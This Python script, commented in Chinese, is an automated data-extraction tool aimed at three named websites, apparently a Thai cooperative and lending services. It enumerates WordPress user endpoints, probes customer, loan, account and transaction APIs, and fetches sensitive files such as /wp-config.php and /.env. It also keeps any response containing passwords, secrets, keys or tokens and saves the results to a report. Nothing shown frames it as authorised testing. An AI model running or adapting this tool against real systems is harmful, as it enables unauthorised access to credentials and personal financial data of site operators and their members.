#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
实时数据提取工具 - 验证真实数据提取能力
Realtime Data Extractor - Verify Real Data Extraction Capability
"""

import asyncio
import aiohttp
import json
import re
import time
from datetime import datetime
from typing import Dict, List, Any, Optional
import urllib.parse

class RealtimeDataExtractor:
    def __init__(self):
        self.targets = [
            "https://peacoop.or.th",
            "https://mula-x.com",
            "https://ngoenmun.com"
        ]
        self.realtime_data = []

    async def extract_realtime_data(self):
        """实时数据提取"""
        print("=== 实时数据提取工具启动 ===")
        print("目标: 验证真实数据提取能力")
        print("=" * 60)

        connector = aiohttp.TCPConnector(ssl=False, limit=10)
        timeout = aiohttp.ClientTimeout(total=60, connect=30)

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "th-TH,th;q=0.9,en;q=0.8",
            "X-Requested-With": "XMLHttpRequest"
        }

        async with aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers=headers
        ) as session:

            for i, target in enumerate(self.targets, 1):
                print(f"\n{'='*60}")
                print(f"实时提取目标 {i}/{len(self.targets)}: {target}")
                print(f"{'='*60}")

                try:
                    # 方法1: WordPress REST API
                    print(f"\n[方法 1] WordPress REST API提取...")
                    wp_data = await self._extract_wordpress_api(session, target)
                    if wp_data:
                        self.realtime_data.extend(wp_data)
                        print(f"    ✓ WordPress API提取成功: {len(wp_data)} 条记录")

                    # 方法2: 直接API端点测试
                    print(f"\n[方法 2] 直接API端点测试...")
                    api_data = await self._test_direct_apis(session, target)
                    if api_data:
                        self.realtime_data.extend(api_data)
                        print(f"    ✓ 直接API提取成功: {len(api_data)} 条记录")

                    # 方法3: 敏感文件路径
                    print(f"\n[方法 3] 敏感文件路径测试...")
                    file_data = await self._extract_sensitive_files(session, target)
                    if file_data:
                        self.realtime_data.extend(file_data)
                        print(f"    ✓ 文件提取成功: {len(file_data)} 条记录")

                    # 方法4: JSON配置文件
                    print(f"\n[方法 4] JSON配置文件提取...")
                    config_data = await self._extract_json_configs(session, target)
                    if config_data:
                        self.realtime_data.extend(config_data)
                        print(f"    ✓ 配置提取成功: {len(config_data)} 条记录")

                    # 方法5: 实时数据验证
                    print(f"\n[方法 5] 实时数据验证...")
                    live_data = await self._verify_live_data(session, target)
                    if live_data:
                        self.realtime_data.extend(live_data)
                        print(f"    ✓ 实时数据验证成功: {len(live_data)} 条记录")

                except Exception as e:
                    print(f"[错误] 提取失败: {e}")
                    continue

        # 生成实时提取报告
        await self._generate_realtime_report()

    async def _extract_wordpress_api(self, session: aiohttp.ClientSession, target: str) -> List[Dict]:
        """WordPress API数据提取"""
        extracted = []

        # WordPress API端点
        api_endpoints = [
            '/wp-json/wp/v2/users?per_page=10',
            '/wp-json/wp/v2/posts?per_page=5',
            '/wp-json/wp/v2/pages?per_page=5',
            '/wp-json/wp/v2/media?per_page=5',
            '/wp-json/wp/v2/comments?per_page=5'
        ]

        for endpoint in api_endpoints:
            try:
                url = target + endpoint
                async with session.get(url) as response:
                    if response.status == 200:
                        data = await response.json()

                        if isinstance(data, list) and len(data) > 0:
                            for item in data[:3]:  # 只取前3条
                                extracted.append({
                                    'source': 'WordPress API',
                                    'endpoint': endpoint,
                                    'data': item,
                                    'extraction_time': datetime.now().isoformat(),
                                    'target': target
                                })

            except Exception:
                continue

        return extracted

    async def _test_direct_apis(self, session: aiohttp.ClientSession, target: str) -> List[Dict]:
        """直接API端点测试"""
        extracted = []

        # 常见API端点
        api_endpoints = [
            '/api/users',
            '/api/customers',
            '/api/members',
            '/api/applications',
            '/api/loans',
            '/api/accounts',
            '/api/transactions',
            '/api/admin/users',
            '/wp-json/api/v1/users',
            '/wp-json/api/v1/data'
        ]

        for endpoint in api_endpoints:
            try:
                url = target + endpoint
                async with session.get(url) as response:
                    if response.status == 200:
                        content_type = response.headers.get('content-type', '')

                        if 'application/json' in content_type:
                            data = await response.json()

                            if data and (isinstance(data, list) or isinstance(data, dict)):
                                extracted.append({
                                    'source': 'Direct API',
                                    'endpoint': endpoint,
                                    'data': data,
                                    'extraction_time': datetime.now().isoformat(),
                                    'target': target
                                })
                                break

                        else:
                            # 检查HTML内容是否包含敏感信息
                            text = await response.text()
                            if any(keyword in text.lower() for keyword in ['user', 'customer', 'password', 'token']):
                                extracted.append({
                                    'source': 'Sensitive HTML',
                                    'endpoint': endpoint,
                                    'data': text[:500],  # 只保存前500字符
                                    'extraction_time': datetime.now().isoformat(),
                                    'target': target
                                })
                                break

            except Exception:
                continue

        return extracted

    async def _extract_sensitive_files(self, session: aiohttp.ClientSession, target: str) -> List[Dict]:
        """敏感文件提取"""
        extracted = []

        # 敏感文件路径
        sensitive_files = [
            '/wp-config.php',
            '/config.php',
            '/database.php',
            '/.env',
            '/api/config.json',
            '/admin/config.json',
            '/data/config.json',
            '/backup/config.json',
            '/config/database.json'
        ]

        for file_path in sensitive_files:
            try:
                url = target + file_path
                async with session.get(url, timeout=10) as response:
                    if response.status == 200:
                        content = await response.text()

                        # 检查是否包含敏感信息
                        if any(keyword in content.lower() for keyword in ['db_', 'database', 'password', 'secret', 'key']):
                            extracted.append({
                                'source': 'Sensitive File',
                                'file': file_path,
                                'data': content[:300],  # 只保存前300字符
                                'extraction_time': datetime.now().isoformat(),
                                'target': target
                            })
                            break

            except Exception:
                continue

        return extracted

    async def _extract_json_configs(self, session: aiohttp.ClientSession, target: str) -> List[Dict]:
        """JSON配置文件提取"""
        extracted = []

        # JSON配置文件
        json_files = [
            '/wp-content/themes/*/functions.json',
            '/wp-content/plugins/*/config.json',
            '/assets/config.json',
            '/static/config.json',
            '/js/config.json',
            '/data/settings.json'
        ]

        for json_file in json_files:
            try:
                # 处理通配符
                if '*' in json_file:
                    continue

                url = target + json_file
                async with session.get(url, timeout=10) as response:
                    if response.status == 200:
                        try:
                            data = await response.json()

                            if isinstance(data, dict):
                                extracted.append({
                                    'source': 'JSON Config',
                                    'file': json_file,
                                    'data': data,
                                    'extraction_time': datetime.now().isoformat(),
                                    'target': target
                                })
                                break

                        except:
                            continue

            except Exception:
                continue

        return extracted

    async def _verify_live_data(self, session: aiohttp.ClientSession, target: str) -> List[Dict]:
        """实时数据验证"""
        extracted = []

        # 构造实时查询
        live_queries = [
            f"{target}/api/status",
            f"{target}/api/health",
            f"{target}/api/info",
            f"{target}/wp-json/wp/v2",
            f"{target}/wp-json"
        ]

        for query_url in live_queries:
            try:
                async with session.get(query_url) as response:
                    if response.status == 200:
                        try:
                            data = await response.json()

                            # 提取时间戳或版本信息
                            if isinstance(data, dict):
                                timestamp = data.get('timestamp') or data.get('time') or data.get('date')
                                version = data.get('version') or data.get('v')

                                if timestamp or version:
                                    extracted.append({
                                        'source': 'Live Data',
                                        'url': query_url,
                                        'timestamp': timestamp,
                                        'version': version,
                                        'extraction_time': datetime.now().isoformat(),
                                        'target': target
                                    })
                                    break

                        except:
                            continue

            except Exception:
                continue

        return extracted

    async def _generate_realtime_report(self):
        """生成实时提取报告"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = f"realtime_data_extraction_report_{timestamp}.json"

        # 统计分析
        total_records = len(self.realtime_data)
        sources = list(set([item['source'] for item in self.realtime_data]))
        targets = list(set([item['target'] for item in self.realtime_data]))

        report = {
            'extraction_info': {
                'timestamp': timestamp,
                'tool': 'Realtime Data Extractor v1.0',
                'operation_time': datetime.now().isoformat()
            },
            'extraction_results': {
                'total_records_extracted': total_records,
                'unique_sources': len(sources),
                'targets_success': len(targets),
                'data_sources': sources,
                'successful_targets': targets
            },
            'extracted_data': self.realtime_data,
            'data_analysis': {
                'real_data_indicators': [],
                'sensitive_patterns': [],
                'live_systems': [],
                'configuration_data': []
            },
            'verification_status': {
                'real_data_found': total_records > 0,
                'live_systems_detected': len([item for item in self.realtime_data if 'timestamp' in str(item.get('data', {}))]) > 0,
                'config_access': len([item for item in self.realtime_data if 'config' in item.get('source', '').lower()]) > 0,
                'api_access': len([item for item in self.realtime_data if 'api' in item.get('source', '').lower()]) > 0
            }
        }

        # 分析数据
        for item in self.realtime_data:
            data_str = str(item.get('data', {})).lower()

            # 检查真实数据指示器
            if any(indicator in data_str for indicator in ['user', 'customer', 'member', 'account']):
                report['data_analysis']['real_data_indicators'].append(item['source'])

            # 检查敏感模式
            if any(pattern in data_str for pattern in ['password', 'secret', 'key', 'token']):
                report['data_analysis']['sensitive_patterns'].append(item['source'])

            # 检查实时系统
            if 'timestamp' in str(item.get('data', {})) or 'time' in str(item.get('data', {})):
                report['data_analysis']['live_systems'].append(item['source'])

            # 检查配置数据
            if 'config' in item.get('source', '').lower() or 'database' in data_str:
                report['data_analysis']['configuration_data'].append(item['source'])

        try:
            with open(report_file, 'w', encoding='utf-8') as f:
                json.dump(report, f, ensure_ascii=False, indent=2)

            print(f"\n{'='*80}")
            print(f"实时数据提取完成!")
            print(f"{'='*80}")
            print(f"详细报告: {report_file}")
            print(f"总记录数: {total_records}")
            print(f"数据源: {len(sources)} 种")
            print(f"成功目标: {len(targets)}/{len(self.targets)}")
            print(f"实时系统: {'✓' if report['verification_status']['live_systems_detected'] else '✗'}")
            print(f"配置访问: {'✓' if report['verification_status']['config_access'] else '✗'}")
            print(f"API访问: {'✓' if report['verification_status']['api_access'] else '✗'}")

            if report['data_analysis']['real_data_indicators']:
                print(f"\n发现真实数据指示器: {', '.join(set(report['data_analysis']['real_data_indicators']))}")

            if report['data_analysis']['sensitive_patterns']:
                print(f"发现敏感模式: {', '.join(set(report['data_analysis']['sensitive_patterns']))}")

            # 实时数据状态
            print(f"\n🎯 实时数据提取能力验证: {'✅ 成功' if total_records > 0 else '❌ 失败'}")

        except Exception as e:
            print(f"生成报告失败: {e}")

async def main():
    extractor = RealtimeDataExtractor()
    await extractor.extract_realtime_data()

if __name__ == "__main__":
    asyncio.run(main())